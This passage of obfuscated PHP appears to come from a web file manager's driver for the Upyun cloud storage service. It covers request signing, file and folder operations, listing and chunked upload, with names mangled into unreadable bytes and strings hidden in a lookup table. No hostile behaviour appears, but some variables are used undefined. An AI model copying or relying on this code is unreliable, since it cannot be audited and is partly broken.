$Aèìà˜ÓÉ†[1614]; $E–ˆÚÑ²­Ø += 4; $F§½ìÍÏËœ = $Aèìà˜ÓÉ†[1613]; } elseif ($Aèìà˜ÓÉ†[1615] == substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø, 5)) { $C¬ùÚÍ×«Ç = $Aèìà˜ÓÉ†[1614]; $E–ˆÚÑ²­Ø += 5; $F§½ìÍÏËœ = $Aèìà˜ÓÉ†[1615]; } elseif ($Aèìà˜ÓÉ†[1616] == substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø, 6)) { $C¬ùÚÍ×«Ç = $Aèìà˜ÓÉ†[1616]; $E–ˆÚÑ²­Ø += 6; if (1 == preg_match($Aèìà˜ÓÉ†[1617], substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø), $D»íøÔíĞé)) { $E–ˆÚÑ²­Ø += strlen($D»íøÔíĞé[0]); $C®ì¤‚¬Úß = $Aèìà˜ÓÉ†[1618]; $Fñí”ö¤—ç = preg_match($C®ì¤‚¬Úß, substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø), $D»íøÔíĞé, PREG_OFFSET_CAPTURE); if (1 == $Fñí”ö¤—ç) { $F§½ìÍÏËœ = substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø, $D»íøÔíĞé[0][1]); $E–ˆÚÑ²­Ø += $D»íøÔíĞé[1][1]; } } } elseif ($Aèìà˜ÓÉ†[1619] == substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø, 9)) { $C¬ùÚÍ×«Ç = $Aèìà˜ÓÉ†[1619]; $E–ˆÚÑ²­Ø += 9; } elseif (1 == preg_match($Aèìà˜ÓÉ†[1620], substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø, 33), $D»íøÔíĞé)) { $C¬ùÚÍ×«Ç = $Aèìà˜ÓÉ†[1582]; $E–ˆÚÑ²­Ø += strlen($D»íøÔíĞé[0]); $F§½ìÍÏËœ = intval($D»íøÔíĞé[1]) . $Aèìà˜ÓÉ†[70] . intval($D»íøÔíĞé[2]); } elseif (1 == preg_match($Aèìà˜ÓÉ†[1621], substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø, 33), $D»íøÔíĞé)) { $C¬ùÚÍ×«Ç = $Aèìà˜ÓÉ†[1622]; $F§½ìÍÏËœ = intval($D»íøÔíĞé[1]) . $Aèìà˜ÓÉ†[70] . intval($D»íøÔíĞé[2]); $E–ˆÚÑ²­Ø += strlen($D»íøÔíĞé[0]); } elseif (($e‹ŸÄ¾è÷ = strspn($F‹Èœ›ªˆø, $Aèìà˜ÓÉ†[1623], $E–ˆÚÑ²­Ø)) > 0) { $C¬ùÚÍ×«Ç = $Aèìà˜ÓÉ†[1624]; $F§½ìÍÏËœ = substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø, $e‹ŸÄ¾è÷); $E–ˆÚÑ²­Ø += $e‹ŸÄ¾è÷; } break; } goto aæ†‰”ğ·; aæ†‰”ğ·: return array($C¬ùÚÍ×«Ç, $F§½ìÍÏËœ, $E–ˆÚÑ²­Ø); goto a™¹Û…âõ»; a™¹Û…âõ»: } } goto bà ÍÅ‘§Ä; fö›æÃ¬¥‘: define($_SERVER[¬ˆÚÂ”Éğä][1951], 4); define($_SERVER[¬ˆÚÂ”Éğä][1952], 5); define($_SERVER[¬ˆÚÂ”Éğä][1953], 16); goto bğ™Ãà™¦; f˜®Œ¥ö°: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\72\x2f\x2f\166\x30\56\141\160\151\56\165\x70\171\165\x6e\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($aÒ£ÚÄÛàö) { parent::__construct(); $this->_init($aÒ£ÚÄÛàö); } public function _init($aí¼êëÓÛ) { foreach ($aí¼êëÓÛ as $e–ßÎßÇš => $f¹±´Ø±ò—) { if (isset($this->{$e–ßÎßÇš})) { $this->{$e–ßÎßÇš} = $f¹±´Ø±ò—; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[¬ˆÚÂ”Éğä][1254], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($B¹‡ï¨İ×, $b‰æ‰Ò·±” = "\107\x45\x54") { $c—‡Æ¤ÂİÖ =& $_SERVER[¬ˆÚÂ”Éğä]; $eÜ¨Á“•â¿ = gmdate($c—‡Æ¤ÂİÖ[1218]); $bìÆŠÎ¥Ÿø = base64_encode(hash_hmac($c—‡Æ¤ÂİÖ[1255], "{$b‰æ‰Ò·±”}\46{$B¹‡ï¨İ×}\x26{$eÜ¨Á“•â¿}", md5("{$this->userpass}"), !0)); $bˆŠì™˜ÇÑ = array("\x41\x75\x74\x68\157\x72\151\x7a\x61\164\151\x6f\x6e\x3a\x55\x50\x59\x55\116\x20{$this->username}\x3a{$bìÆŠÎ¥Ÿø}", "\x44\x61\x74\145\x3a{$eÜ¨Á“•â¿}"); return $bˆŠì™˜ÇÑ; } public function ussRequest($dŠñàÔ³º, $Aò’œ·¡ãö = "\x47\x45\x54", $eõÌ£¼¾Ğ¡ = false, $DÕéâ—¢“ = false, $e•©‹… = false) { goto BÙï“Ôëå˜; d‡ª°½¾ä: $fÅ¢ÁºÔì› = $this->ussHeaders($EÀÜÈÁ¤ù, $Aò’œ·¡ãö); if ($DÕéâ—¢“) { $fÅ¢ÁºÔì› = array_merge($fÅ¢ÁºÔì›, $DÕéâ—¢“); } $d¤Şƒ‰å¦‡ = url_request($this->endpoint . $EÀÜÈÁ¤ù, $Aò’œ·¡ãö, $eõÌ£¼¾Ğ¡, $fÅ¢ÁºÔì›, $e•©‹…); goto Fêáò·ó…; BÙï“Ôëå˜: $dÔÇ¢ŒÅ =& $_SERVER[¬ˆÚÂ”Éğä]; $dŠñàÔ³º = trim($dŠñàÔ³º, $dÔÇ¢ŒÅ[8]); $EÀÜÈÁ¤ù = "\x2f{$this->bucket}\57{$dŠñàÔ³º}"; goto d‡ª°½¾ä; Fêáò·ó…: if (!$d¤Şƒ‰å¦‡) { return array($dÔÇ¢ŒÅ[1045] => !1, $dÔÇ¢ŒÅ[1047] => $dÔÇ¢ŒÅ[1256]); } if (strtolower($Aò’œ·¡ãö) == $dÔÇ¢ŒÅ[184] || in_array($d¤Şƒ‰å¦‡[$dÔÇ¢ŒÅ[1045]], array($dÔÇ¢ŒÅ[1113], $dÔÇ¢ŒÅ[1257]))) { $eõÌ£¼¾Ğ¡ = $d¤Şƒ‰å¦‡[$dÔÇ¢ŒÅ[1258]]; } else { $eõÌ£¼¾Ğ¡ = json_decode($d¤Şƒ‰å¦‡[$dÔÇ¢ŒÅ[1047]], !0); if (!$eõÌ£¼¾Ğ¡) { $eõÌ£¼¾Ğ¡ = $d¤Şƒ‰å¦‡[$dÔÇ¢ŒÅ[1047]]; } else { if (!$d¤Şƒ‰å¦‡[$dÔÇ¢ŒÅ[697]] && isset($eõÌ£¼¾Ğ¡[$dÔÇ¢ŒÅ[1259]])) { $eõÌ£¼¾Ğ¡ = $eõÌ£¼¾Ğ¡[$dÔÇ¢ŒÅ[1259]]; } } } return array($dÔÇ¢ŒÅ[1045] => $d¤Şƒ‰å¦‡[$dÔÇ¢ŒÅ[697]], $dÔÇ¢ŒÅ[1047] => $eõÌ£¼¾Ğ¡); goto eÇ†Æˆà«ñ; eÇ†Æˆà«ñ: } public function mkfile($BÀ‰©ğ×îë, $EÕÕ’‹Å— = '', $Cç·Ç¡±Œá = REPEAT_RENAME) { if ($this->setContent($BÀ‰©ğ×îë, $EÕÕ’‹Å—)) { return $this->getPathOuter($BÀ‰©ğ×îë); } return !1; } public function mkdir($e‹òŠæåÙ, $BÜ×”½ƒË× = REPEAT_SKIP) { $e½„íõ² =& $_SERVER[¬ˆÚÂ”Éğä]; $B¨İî›Àò« = trim($e‹òŠæåÙ, $e½„íõ²[8]); if ($this->_isFolder($B¨İî›Àò«)) { return $this->getPathOuter($B¨İî›Àò«); } $eáæ½šæ„ = array($e½„íõ²[1260]); $D«·Ø‘Ëå« = $this->ussRequest($B¨İî›Àò«, $e½„íõ²[212], !1, $eáæ½šæ„); return $D«·Ø‘Ëå«[$e½„íõ²[1045]] ? $this->getPathOuter($B¨İî›Àò«) : !1; } public function copyFile($Eİø£õ“¨¨, $B÷ÊŸõã¤—) { $bŠÅÉ““ =& $_SERVER[¬ˆÚÂ”Éğä]; $AÖ§øæê‘¬ = array($bŠÅÉ““[1261] . "\57{$this->bucket}\x2f{$Eİø£õ“¨¨}", $bŠÅÉ““[1262]); $d¹š„ÑÖ¤À = $this->ussRequest($B÷ÊŸõã¤—, $bŠÅÉ““[214], !1, $AÖ§øæê‘¬); return $d¹š„ÑÖ¤À[$bŠÅÉ““[1045]] ? !0 : $this->getPathOuter($B÷ÊŸõã¤—); } public function moveFile($aóÅí¥¡¶´, $B¨‚Ë²„ï¦) { $FÑéé§Ç‹ª =& $_SERVER[¬ˆÚÂ”Éğä]; $Eá¶©ŞóÖ¿ = array($FÑéé§Ç‹ª[1263] . "\57{$this->bucket}\x2f{$aóÅí¥¡¶´}", $FÑéé§Ç‹ª[1262]); $CÔÌ”´­¬Õ = $this->ussRequest($B¨‚Ë²„ï¦, $FÑéé§Ç‹ª[214], !1, $Eá¶©ŞóÖ¿); return $CÔÌ”´­¬Õ[$FÑéé§Ç‹ª[1045]] ? !0 : $this->getPathOuter($B¨‚Ë²„ï¦); } public function delFile($e©î”Î»õá) { $f±Æƒ¥„±ƒ =& $_SERVER[¬ˆÚÂ”Éğä]; $Cà §Î£î® = $this->ussRequest($e©î”Î»õá, $f±Æƒ¥„±ƒ[1264]); return $Cà §Î£î®[$f±Æƒ¥„±ƒ[1045]] ? !0 : !1; } public function delFolder($F¢§ö„íÎô) { $a‘ğ‘ÄéÍã =& $_SERVER[¬ˆÚÂ”Éğä]; $B§±„ˆÕÂÖ = $this->listAll($F¢§ö„íÎô); krsort($B§±„ˆÕÂÖ); foreach ($B§±„ˆÕÂÖ as $fëÓ«ˆÁËÏ) { $this->ussRequest($fëÓ«ˆÁËÏ[$a‘ğ‘ÄéÍã[75]], $a‘ğ‘ÄéÍã[1264]); } return $this->ussRequest($F¢§ö„íÎô, $a‘ğ‘ÄéÍã[1264]); } public function rename($bÊ›ˆÀèóˆ, $fëÖÆšìİ) { if ($this->isFile($bÊ›ˆÀèóˆ)) { $fëÖÆšìİ = get_path_father($bÊ›ˆÀèóˆ) . $fëÖÆšìİ; return $this->moveFile($bÊ›ˆÀèóˆ, $fëÖÆšìİ); } return $this->renameObject($bÊ›ˆÀèóˆ, $fëÖÆšìİ); } public function fileInfo($DË¹ä÷™¬¦, $bÜ ¦Í×Ğ = false, $fÄ“Š”ÖÄŒ = array()) { $FĞƒ¶¢®ÖŞ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($bÜ ¦Í×Ğ) { return array($FĞƒ¶¢®ÖŞ[28] => $this->pathThis($DË¹ä÷™¬¦), $FĞƒ¶¢®ÖŞ[75] => $this->getPathOuter($FĞƒ¶¢®ÖŞ[8] . $DË¹ä÷™¬¦), $FĞƒ¶¢®ÖŞ[29] => $FĞƒ¶¢®ÖŞ[167], $FĞƒ¶¢®ÖŞ[77] => isset($fÄ“Š”ÖÄŒ[$FĞƒ¶¢®ÖŞ[325]]) ? $fÄ“Š”ÖÄŒ[$FĞƒ¶¢®ÖŞ[325]] : 0, $FĞƒ¶¢®ÖŞ[160] => $this->ext($DË¹ä÷™¬¦)); } $e¶†” = array($FĞƒ¶¢®ÖŞ[28] => $this->pathThis($DË¹ä÷™¬¦), $FĞƒ¶¢®ÖŞ[75] => $this->getPathOuter($FĞƒ¶¢®ÖŞ[8] . $DË¹ä÷™¬¦), $FĞƒ¶¢®ÖŞ[29] => $FĞƒ¶¢®ÖŞ[167], $FĞƒ¶¢®ÖŞ[187] => 0, $FĞƒ¶¢®ÖŞ[107] => isset($fëà¸“Óåß[$FĞƒ¶¢®ÖŞ[1265]]) ? $fëà¸“Óåß[$FĞƒ¶¢®ÖŞ[1265]] : 0, $FĞƒ¶¢®ÖŞ[77] => isset($fÄ“Š”ÖÄŒ[$FĞƒ¶¢®ÖŞ[325]]) ? $fÄ“Š”ÖÄŒ[$FĞƒ¶¢®ÖŞ[325]] : 0, $FĞƒ¶¢®ÖŞ[160] => $this->ext($DË¹ä÷™¬¦), $FĞƒ¶¢®ÖŞ[188] => !0, $FĞƒ¶¢®ÖŞ[189] => !0); if (empty($fÄ“Š”ÖÄŒ)) { $fÄ“Š”ÖÄŒ = $this->objectMeta($DË¹ä÷™¬¦); if (!$fÄ“Š”ÖÄŒ) { return $e¶†”; } $e¶†”[$FĞƒ¶¢®ÖŞ[187]] = $fÄ“Š”ÖÄŒ[$FĞƒ¶¢®ÖŞ[1266]]; $e¶†”[$FĞƒ¶¢®ÖŞ[107]] = $fÄ“Š”ÖÄŒ[$FĞƒ¶¢®ÖŞ[1267]]; $e¶†”[$FĞƒ¶¢®ÖŞ[77]] = $fÄ“Š”ÖÄŒ[$FĞƒ¶¢®ÖŞ[77]]; } return $e¶†”; } public function folderInfo($eéê¡‰¤, $AÔØíÕÄÒ„ = false) { $e¸ÉóêÑ„ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($AÔØíÕÄÒ„) { return array($e¸ÉóêÑ„[28] => $this->pathThis($eéê¡‰¤), $e¸ÉóêÑ„[75] => $this->getPathOuter($e¸ÉóêÑ„[8] . $eéê¡‰¤), $e¸ÉóêÑ„[29] => $e¸ÉóêÑ„[76]); } $CÍ…ÜäîéŸ = array($e¸ÉóêÑ„[28] => $this->pathThis($eéê¡‰¤), $e¸ÉóêÑ„[75] => $this->getPathOuter($e¸ÉóêÑ„[8] . $eéê¡‰¤), $e¸ÉóêÑ„[29] => $e¸ÉóêÑ„[76], $e¸ÉóêÑ„[187] => 0, $e¸ÉóêÑ„[107] => isset($D•ò‰Ò˜ÈĞ[$e¸ÉóêÑ„[1265]]) ? $D•ò‰Ò˜ÈĞ[$e¸ÉóêÑ„[1265]] : 0, $e¸ÉóêÑ„[1175] => !0, $e¸ÉóêÑ„[1176] => !0); if (empty($a­‹í¼™)) { $a­‹í¼™ = $this->objectMeta($eéê¡‰¤); if (!$a­‹í¼™) { return $CÍ…ÜäîéŸ; } $CÍ…ÜäîéŸ[$e¸ÉóêÑ„[187]] = $a­‹í¼™[$e¸ÉóêÑ„[1266]]; $CÍ…ÜäîéŸ[$e¸ÉóêÑ„[107]] = $a­‹í¼™[$e¸ÉóêÑ„[1267]]; } return $CÍ…ÜäîéŸ; } private function fileList($aß´—Îäî¡, $e¿‰§Ò³î = 0, $aö’±¾É†¥ = 1000) { $bšŞöğŸÖ¼ =& $_SERVER[¬ˆÚÂ”Éğä]; $b÷ØåÎŠòŞ = array($bšŞöğŸÖ¼[1268], $bšŞöğŸÖ¼[1269] . $aö’±¾É†¥); if ($e¿‰§Ò³î) { $b÷ØåÎŠòŞ[] = $bšŞöğŸÖ¼[1270] . $e¿‰§Ò³î; } $f…âéŠçÅ§ = $this->ussRequest($aß´—Îäî¡, $bšŞöğŸÖ¼[216], !1, $b÷ØåÎŠòŞ); return !$f…âéŠçÅ§[$bšŞöğŸÖ¼[1045]] ? !1 : $f…âéŠçÅ§[$bšŞöğŸÖ¼[1047]]; } public function listPath($E‰¢ß—õ×Ä, $Fëøº¡Ç– = false) { goto Cå“¿®´íµ; e¨œ‡Œàµ¶: $a×öÎÑƒ³• = $E®—…‡·Ö = array(); $B‰ÊˆÔ’´º = rtrim($E‰¢ß—õ×Ä, $E©Ÿç™È„[8]) . $E©Ÿç™È„[8]; while (!0) { $a÷¨î¢š×à = $this->fileList($E‰¢ß—õ×Ä, $Eõ‘åŒ‰³¦, $a‚´³¬­¯); if (!$a÷¨î¢š×à) { return !1; } $Eõ‘åŒ‰³¦ = isset($a÷¨î¢š×à[$E©Ÿç™È„[1271]]) ? $a÷¨î¢š×à[$E©Ÿç™È„[1271]] : $E©Ÿç™È„[33]; $D„àÈ½ÅõÖ = isset($a÷¨î¢š×à[$E©Ÿç™È„[1272]]) ? $a÷¨î¢š×à[$E©Ÿç™È„[1272]] : array(); foreach ($D„àÈ½ÅõÖ as $EÂ’Šø¬”) { if ($EÂ’Šø¬”[$E©Ÿç™È„[29]] == $E©Ÿç™È„[76]) { $a×öÎÑƒ³•[] = $this->folderInfo($B‰ÊˆÔ’´º . $EÂ’Šø¬”[$E©Ÿç™È„[28]], $Fëøº¡Ç–, $EÂ’Šø¬”); } else { $E®—…‡·Ö[] = $this->fileInfo($B‰ÊˆÔ’´º . $EÂ’Šø¬”[$E©Ÿç™È„[28]], $Fëøº¡Ç–, $EÂ’Šø¬”); } } if (count($D„àÈ½ÅõÖ) < $a‚´³¬­¯) { break; } } goto Bš‘ƒÍÒ‹; Cå“¿®´íµ: $E©Ÿç™È„ =& $_SERVER[¬ˆÚÂ”Éğä]; $Eõ‘åŒ‰³¦ = $E©Ÿç™È„[33]; $a‚´³¬­¯ = 1000; goto e¨œ‡Œàµ¶; Bš‘ƒÍÒ‹: return array($E©Ÿç™È„[74] => $a×öÎÑƒ³•, $E©Ÿç™È„[73] => $E®—…‡·Ö); goto E†ŒÈ•áœ; E†ŒÈ•áœ: } private function recursionAllFiles($a×„¿ôˆ­˜, &$B¤…ªõ—†ˆ) { $cÇïù¶ˆ—– =& $_SERVER[¬ˆÚÂ”Éğä]; $CÛ¸ôÉøÆ¯ = $cÇïù¶ˆ—–[33]; $e•ÏÔšÄß« = 1000; $EØÁ‘Ö‰¯Š = $B¸à¹±ŠÈñ = array(); $CŞù’ÅƒÇ = rtrim($a×„¿ôˆ­˜, $cÇïù¶ˆ—–[8]) . $cÇïù¶ˆ—–[8]; while (!0) { $eˆ÷»ã± = $this->fileList($a×„¿ôˆ­˜, $CÛ¸ôÉøÆ¯, $e•ÏÔšÄß«); if (!$eˆ÷»ã±) { return !1; } $CÛ¸ôÉøÆ¯ = isset($eˆ÷»ã±[$cÇïù¶ˆ—–[1271]]) ? $eˆ÷»ã±[$cÇïù¶ˆ—–[1271]] : $cÇïù¶ˆ—–[33]; $fÏ°ó×à‘ì = isset($eˆ÷»ã±[$cÇïù¶ˆ—–[1272]]) ? $eˆ÷»ã±[$cÇïù¶ˆ—–[1272]] : array(); foreach ($fÏ°ó×à‘ì as $d÷¬Ñ™ĞÌë) { $DÏƒ ƒõ²™ = array($cÇïù¶ˆ—–[75] => $CŞù’ÅƒÇ . $d÷¬Ñ™ĞÌë[$cÇïù¶ˆ—–[28]], $cÇïù¶ˆ—–[76] => $d÷¬Ñ™ĞÌë[$cÇïù¶ˆ—–[29]] == $cÇïù¶ˆ—–[76] ? 1 : 0, $cÇïù¶ˆ—–[77] => isset($d÷¬Ñ™ĞÌë[$cÇïù¶ˆ—–[325]]) ? $d÷¬Ñ™ĞÌë[$cÇïù¶ˆ—–[325]] : 0); $B¤…ªõ—†ˆ[] = $DÏƒ ƒõ²™; if ($DÏƒ ƒõ²™[$cÇïù¶ˆ—–[76]] == 1) { $this->recursionAllFiles($DÏƒ ƒõ²™[$cÇïù¶ˆ—–[75]], $B¤…ªõ—†ˆ); } } if (count($fÏ°ó×à‘ì) < $e•ÏÔšÄß«) { break; } } } public function has($eÉŠäÄ®³, $D¹Ç•Å‡Ö¶ = false, $Fç‘Æ”‹ = true) { goto Cª§áŒõÚ; Cª§áŒõÚ: $F¨Ğ½ µ“­ =& $_SERVER[¬ˆÚÂ”Éğä]; $Bè“Ô„‘±¾ = $F¨Ğ½ µ“­[33]; $C‹‡›ÎÅ¹ = 1000; goto EìÔÕ˜È¿; EìÔÕ˜È¿: $d¾óãĞ¹¢â = 0; $c¼„éØº…Õ = 0; $eÖ«å‹¬‘ = rtrim($eÉŠäÄ®³, $F¨Ğ½ µ“­[8]) . $F¨Ğ½ µ“­[8]; goto C”ªÈ¼›¹ê; C”ªÈ¼›¹ê: while (!0) { $C¦ø‚‘…± = $this->fileList($eÉŠäÄ®³, $Bè“Ô„‘±¾, $C‹‡›ÎÅ¹); if (!$C¦ø‚‘…±) { return !1; } $Bè“Ô„‘±¾ = isset($C¦ø‚‘…±[$F¨Ğ½ µ“­[1271]]) ? $C¦ø‚‘…±[$F¨Ğ½ µ“­[1271]] : $F¨Ğ½ µ“­[33]; $A±Îã’ğÎš = isset($C¦ø‚‘…±[$F¨Ğ½ µ“­[1272]]) ? $C¦ø‚‘…±[$F¨Ğ½ µ“­[1272]] : array(); if (empty($A±Îã’ğÎš)) { break; } $F†İ¼›øØ = array_to_keyvalue($A±Îã’ğÎš, $F¨Ğ½ µ“­[33], $F¨Ğ½ µ“­[29]); $a‡îêˆÚÍ… = array_count_values($F†İ¼›øØ); $Cš—ÃµÍªø = isset($a‡îêˆÚÍ…[$F¨Ğ½ µ“­[76]]) ? $a‡îêˆÚÍ…[$F¨Ğ½ µ“­[76]] : 0; $fïÖé¾’Åã = count($F†İ¼›øØ) - $Cš—ÃµÍªø; if ($D¹Ç•Å‡Ö¶) { $c¼„éØº…Õ += $Cš—ÃµÍªø; $d¾óãĞ¹¢â += $fïÖé¾’Åã; if ($bÈ‰å’ò¤ < $C‹‡›ÎÅ¹) { break; } continue; } if ($Fç‘Æ”‹) { if ($fïÖé¾’Åã) { return !0; } } else { if ($Cš—ÃµÍªø) { return !0; } } if (count($A±Îã’ğÎš) < $C‹‡›ÎÅ¹) { break; } } if ($D¹Ç•Å‡Ö¶) { return array($F¨Ğ½ µ“­[191] => $d¾óãĞ¹¢â, $F¨Ğ½ µ“­[192] => $c¼„éØº…Õ); } return !1; goto E¾ÇáÚ° ; E¾ÇáÚ° : } public function listAll($Aº¹áÑ•Õµ) { $A«¬Ö†Ù›Ò = array(); $this->recursionAllFiles($Aº¹áÑ•Õµ, $A«¬Ö†Ù›Ò); return $A«¬Ö†Ù›Ò; } public function canRead($a¶İÇë…) { return $this->exist($a¶İÇë…) ? !0 : !1; } public function canWrite($Fç˜°’‰) { return $this->exist($Fç˜°’‰) ? !0 : !1; } public function getContent($fËœ›•¦Ç¾) { return $this->fileSubstr($fËœ›•¦Ç¾, 0, -1); } public function setContent($a°ºíÕà•É, $B¯ïÒ›Œ‘ = '') { $Aä™îƒ¹§ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$B¯ïÒ›Œ‘) { $E´”„¼Ÿğœ = $this->ussRequest($a°ºíÕà•É, $Aä™îƒ¹§[212]); return $E´”„¼Ÿğœ[$Aä™îƒ¹§[1045]]; } $d‹³‰¯Ò« = $this->tempFile($this->pathThis($a°ºíÕà•É)); file_put_contents($d‹³‰¯Ò«, $B¯ïÒ›Œ‘); if ($this->upload($a°ºíÕà•É, $d‹³‰¯Ò«)) { $this->tempFileRemve($d‹³‰¯Ò«); return !0; } return !1; } public function fileSubstr($Bô®ÏÑİ“İ, $b¿¾ˆÃ§šÀ, $B¥¼¨¯‡ĞŠ) { $e‘ƒï×’‚¬ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!($E„ø‡¡®ÍØ = $this->link($Bô®ÏÑİ“İ))) { return !1; } $b…•£ùŒè° = !1; if ($B¥¼¨¯‡ĞŠ > 0) { $F°ã‘²ô‰ = $b¿¾ˆÃ§šÀ + $B¥¼¨¯‡ĞŠ - 1; $b…•£ùŒè° = array($e‘ƒï×’‚¬[1233] . $b¿¾ˆÃ§šÀ . $e‘ƒï×’‚¬[412] . $F°ã‘²ô‰); } $FÕ­Áëİ = url_request($E„ø‡¡®ÍØ, $e‘ƒï×’‚¬[216], !1, $b…•£ùŒè°); return $FÕ­Áëİ[$e‘ƒï×’‚¬[697]] ? $FÕ­Áëİ[$e‘ƒï×’‚¬[1047]] : !1; } public function upload($c÷°²†å…ù, $aŠ©ô‰õ„¢, $c²ŒïÖß£ = false, $Eù‡Á÷«‹¬ = REPEAT_REPLACE) { goto DÚŞöº‘ªˆ; a…··Ûè×: $F‹¥Œ¡µŠò = $d«¾Ïê•ŸŠ[$c¤ìÁ¥ô²é[1278]]; $fÁ“éíó¬ø = fopen($aŠ©ô‰õ„¢, $c¤ìÁ¥ô²é[1183]); if (!$fÁ“éíó¬ø) { return !1; } goto b‡ùá§¹¹; b‡ùá§¹¹: do { $dåÍñ‘è—‡ = $d«¾Ïê•ŸŠ[$c¤ìÁ¥ô²é[1279]]; fseek($fÁ“éíó¬ø, $FñĞÏ’­Ã); $aŞ½º©¹ŸÇ = fread($fÁ“éíó¬ø, $dåÍñ‘è—‡); $cÇî…®ƒóÊ = 0; do { $cÇî…®ƒóÊ++; $d«¾Ïê•ŸŠ = $this->uploadPart($c÷°²†å…ù, $d«¾Ïê•ŸŠ, $aŞ½º©¹ŸÇ); } while (!$d«¾Ïê•ŸŠ && $cÇî…®ƒóÊ < 3); if (!$d«¾Ïê•ŸŠ) { return !1; } $F‹¥Œ¡µŠò = $d«¾Ïê•ŸŠ[$c¤ìÁ¥ô²é[1278]]; $FñĞÏ’­Ã += $dåÍñ‘è—‡; } while ($F‹¥Œ¡µŠò != -1); fclose($fÁ“éíó¬ø); $b„µ™÷—ã = array($c¤ìÁ¥ô²é[1280], $c¤ìÁ¥ô²é[1281] . $d«¾Ïê•ŸŠ[$c¤ìÁ¥ô²é[1282]], $c¤ìÁ¥ô²é[1276]); goto bˆÉÈŒ¶á˜; cÊÑÍÎÎÇ¦: $A§Ì®™Ûç = 1024 * 1024 * 10; $b„µ™÷—ã = array($c¤ìÁ¥ô²é[1274], $c¤ìÁ¥ô²é[1275] . $EÔ¶ÎÃ‘ß, $c¤ìÁ¥ô²é[1276], $c¤ìÁ¥ô²é[1277] . $A§Ì®™Ûç); $a£Ùâª“£í = $this->ussRequest($c÷°²†å…ù, $c¤ìÁ¥ô²é[214], !1, $b„µ™÷—ã); goto aÚ£ã˜ôöå; DÚŞöº‘ªˆ: $c¤ìÁ¥ô²é =& $_SERVER[¬ˆÚÂ”Éğä]; $EÔ¶ÎÃ‘ß = IO::size($aŠ©ô‰õ„¢); if ($EÔ¶ÎÃ‘ß <= 1024 * 1024 * 200) { $E£øîÇ¤¯İ = array($c¤ìÁ¥ô²é[1273] . $aŠ©ô‰õ„¢); $a£Ùâª“£í = $this->ussRequest($c÷°²†å…ù, $c¤ìÁ¥ô²é[214], $E£øîÇ¤¯İ); return $a£Ùâª“£í[$c¤ìÁ¥ô²é[1045]] ? $this->getPathOuter($c÷°²†å…ù) : !1; } goto cÊÑÍÎÎÇ¦; aÚ£ã˜ôöå: if (!$a£Ùâª“£í[$c¤ìÁ¥ô²é[1045]]) { return !1; } $d«¾Ïê•ŸŠ = $a£Ùâª“£í[$c¤ìÁ¥ô²é[1047]]; $FñĞÏ’­Ã = 0; goto a…··Ûè×; bˆÉÈŒ¶á˜: $a£Ùâª“£í = $this->ussRequest($c÷°²†å…ù, $c¤ìÁ¥ô²é[214], !1, $b„µ™÷—ã); return $a£Ùâª“£í[$c¤ìÁ¥ô²é[1045]] ? $this->getPathOuter($AÆ…è¡¯¯ê) : !1; goto B’‹…„½Ì“; B’‹…„½Ì“: } private function uploadPart($Bë°Ç‹«„Š, $d—È»£´, &$C™ à±—©) { $C¸ëæÆÇ¬ò =& $_SERVER[¬ˆÚÂ”Éğä]; $C½Ê­Ö­Á = array($C¸ëæÆÇ¬ò[1283], $C¸ëæÆÇ¬ò[1281] . $d—È»£´[$C¸ëæÆÇ¬ò[1282]], $C¸ëæÆÇ¬ò[1284] . $d—È»£´[$C¸ëæÆÇ¬ò[1278]], $C¸ëæÆÇ¬ò[138] . $d—È»£´[$C¸ëæÆÇ¬ò[1279]]); $fğğËğ´¤‰ = $this->ussRequest($Bë°Ç‹«„Š, $C¸ëæÆÇ¬ò[214], $C™ à±—©, $C½Ê­Ö­Á); return !$fğğËğ´¤‰[$C¸ëæÆÇ¬ò[1045]] ? $fğğËğ´¤‰[$C¸ëæÆÇ¬ò[1045]] : $fğğËğ´¤‰[$C¸ëæÆÇ¬ò[1047]]; } public function uploadFormData($fŒç ËãìÑ, $e™òÄŸõÚá = 3600) { return $this->uploadPolicy($fŒç ËãìÑ, $e™òÄŸõÚá); } public function multiUploadFormData($fòÔ‰À¨, $EÕŸÊå’Ç = 3600) { $a”Œ©Şõ¼ï =& $_SERVER[¬ˆÚÂ”Éğä]; $a¶«ãÖù»… = (int) $GLOBALS[$a”Œ©Şõ¼ï[7]][$a”Œ©Şõ¼ï[77]]; return $this->uploadPolicy($fòÔ‰À¨, $EÕŸÊå’Ç, $a¶«ãÖù»…); } private function uploadPolicy($EàİÏ÷÷‹Ü, $cÔŞèøÅ™ = 3600, $A–ÉÂ®ö¡£ = 0) { goto eÑ›´£®ä; b§¬Š‘Š¹‰: $C¾‹•Èçñ = array($DÖø¿İ»·Ï[1285] => $this->bucket, $DÖø¿İ»·Ï[1286] => $EàİÏ÷÷‹Ü, $DÖø¿İ»·Ï[1287] => time() + $cÔŞèøÅ™, $DÖø¿İ»·Ï[1288] => $fÆ°áÌ¶ËĞ); if ($A–ÉÂ®ö¡£) { $C¾‹•Èçñ[$DÖø¿İ»·Ï[1204]] = $A–ÉÂ®ö¡£; } $Cî’áø©– = base64_encode(json_encode($C¾‹•Èçñ)); goto FõÇÚ–’œİ; eÑ›´£®ä: $DÖø¿İ»·Ï =& $_SERVER[¬ˆÚÂ”Éğä]; $B‹Àéö©å¯ = $DÖø¿İ»·Ï[8] . $this->bucket; $fÆ°áÌ¶ËĞ = gmdate($DÖø¿İ»·Ï[1218]); goto b§¬Š‘Š¹‰; FõÇÚ–’œİ: $BªâÚ©®¨ = 